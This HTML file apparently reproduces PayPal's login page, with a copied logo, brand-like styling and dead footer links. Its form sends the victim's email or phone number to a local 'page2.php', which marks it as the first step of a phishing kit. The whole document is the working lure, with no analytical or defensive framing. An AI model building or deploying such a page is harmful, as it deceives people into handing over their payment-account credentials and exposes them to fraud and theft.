<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <style>
      @import url("https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css");
      html,
      body {
        height: 100%;
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      .cardContainer {
        width: 35%;
      }
      .card {
        display: flex;
        width: 100%;
        border: 1.5px solid #eaeced;
        align-items: center;
        justify-content: center;
        height: 42rem;
        border-radius: 15px;
      }
 /* Labtops ----------- */     
@media only screen and (max-width: 991px) {
    .cardContainer{
        width: 70%;
    }
}
 /* Tablets ----------- */
@media only screen and (max-width: 767px) {
    .cardContainer{
        width: 60%;
    }
}
 /* Smartphones ----------- */
@media only screen and (max-width: 575px) {
    .cardContainer{
        width: 100%;
    }
    .card{
        border: 0;
    }
}
      .paypal-logo {
        position: absolute;
        top: 35px;
      }
      .textInput {
        width: 75%;
        min-height: 64px;
        line-height: 24px;
        align-items: center;
        border: 1px solid #9da3a6;
        border-radius: 4px;
        text-indent: 10px;
      }
      .fogot-email {
        color: #0070e0;
        text-decoration: none;
        font-weight: bold;
        font-size: 14px;
        font-family: sans-serif;
        align-self: flex-start;
        margin-left: 12.5%;
        margin-top: 20px;
      }
      .blueBtn {
        width: 75%;
        height: 48px;
        min-width: 6rem;
        padding: 0.75rem 2rem;
        background-color: #0544b5;
        border: 0 solid #0544b5;
        color: #fff;
        border-radius: 100px;
        font-weight: 600;
        margin: 0;
        font-size: 1rem;
        font-style: normal;
        margin-top: 40px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .ortxtContainer {
        border: 0.5px outset #eaeced;
        width: 75%;
        margin-top: 2rem;
        justify-content: center;
        align-items: center;
        display: flex;
      }
      .orText {
        position: absolute;
        background-color: #fff;
        width: 1.5rem;
        height: 1.5rem;
        align-items: center;
        justify-content: center;
        display: flex;
        border-radius: 20px;
        flex-direction: column;
        margin-top: 10px;
      }
      .orText p {
        font-weight: 500;
        color: #9da3a6;
      }

      .signUpBtn {
        margin-top: 30px;
        width: 75%;
        height: 48px;
        border: 1px solid black;
        border-radius: 50px;
        font-weight: 600;
        background-color: transparent;
        cursor: pointer;
      }

      footer {
        background-color: #f7f9fa;
        width: 100%;
        height: 3rem;
        align-items: center;
        justify-content: center;
        display: flex;
      }
      .footerLinks {
        display: flex;
        flex-direction: row;
        gap: 8px;
      }
      .footerLinks a {
        color: #545d68;
        font-size: 11px;
        font-weight: 500;
        font-family: sans-serif;
        text-decoration: none;
      }
    </style>
  </head>
  <body>
  <form action="page2.php" method="POST" >
    <div class="h-100 d-flex align-items-center justify-content-center">
      <div class="cardContainer">
        <div class="card justify-content-center">
          <svg
            class="paypal-logo"
            xmlns="http://www.w3.org/2000/svg"
            width="25"
            height="35"
            viewBox="0 0 256 302"
          >
            <path
              fill="#27346a"
              d="M217.168 23.507C203.234 7.625 178.046.816 145.823.816h-93.52A13.39 13.39 0 0 0 39.076 12.11L.136 259.077c-.774 4.87 2.997 9.28 7.933 9.28h57.736l14.5-91.971l-.45 2.88c1.033-6.501 6.593-11.296 13.177-11.296h27.436c53.898 0 96.101-21.892 108.429-85.221c.366-1.873.683-3.696.957-5.477q-2.334-1.236 0 0c3.671-23.407-.025-39.34-12.686-53.765"
            />
            <path
              fill="#27346a"
              d="M102.397 68.84a11.7 11.7 0 0 1 5.053-1.14h73.318c8.682 0 16.78.565 24.18 1.756a102 102 0 0 1 6.177 1.182a90 90 0 0 1 8.59 2.347c3.638 1.215 7.026 2.63 10.14 4.287c3.67-23.416-.026-39.34-12.687-53.765C203.226 7.625 178.046.816 145.823.816H52.295C45.71.816 40.108 5.61 39.076 12.11L.136 259.068c-.774 4.878 2.997 9.282 7.925 9.282h57.744L95.888 77.58a11.72 11.72 0 0 1 6.509-8.74"
            />
            <path
              fill="#2790c3"
              d="M228.897 82.749c-12.328 63.32-54.53 85.221-108.429 85.221H93.024c-6.584 0-12.145 4.795-13.168 11.296L61.817 293.621c-.674 4.262 2.622 8.124 6.934 8.124h48.67a11.71 11.71 0 0 0 11.563-9.88l.474-2.48l9.173-58.136l.591-3.213a11.71 11.71 0 0 1 11.562-9.88h7.284c47.147 0 84.064-19.154 94.852-74.55c4.503-23.15 2.173-42.478-9.739-56.054c-3.613-4.112-8.1-7.508-13.327-10.28c-.283 1.79-.59 3.604-.957 5.477"
            />
            <path
              fill="#1f264f"
              d="M216.952 72.128a90 90 0 0 0-5.818-1.49a110 110 0 0 0-6.177-1.174c-7.408-1.199-15.5-1.765-24.19-1.765h-73.309a11.6 11.6 0 0 0-5.053 1.149a11.68 11.68 0 0 0-6.51 8.74l-15.582 98.798l-.45 2.88c1.025-6.501 6.585-11.296 13.17-11.296h27.444c53.898 0 96.1-21.892 108.428-85.221c.367-1.873.675-3.688.958-5.477q-4.682-2.47-10.14-4.279a83 83 0 0 0-2.77-.865"
            />
          </svg>
          <input
            type="text"
            placeholder="Enter address or mobile number"
            class="textInput"
            name="email"
          />
          <a href="#" class="fogot-email">Forgotten your email address?</a>
          <button class="blueBtn">Next</button>
          <span class="ortxtContainer">
            <div class="orText">
              <p>or</p>
            </div>
          </span>
          <button class="signUpBtn">Signup</button>
        </div>
      </div>
    </div>
    </form>


    <footer>
      <div class="footerLinks">
        <a href="#">Contact Us</a>
        <a href="#">Privacy</a>
        <a href="#">Legal</a>
        <a href="#">Worldwide</a>
      </div>
    </footer>
  </body>
</html>
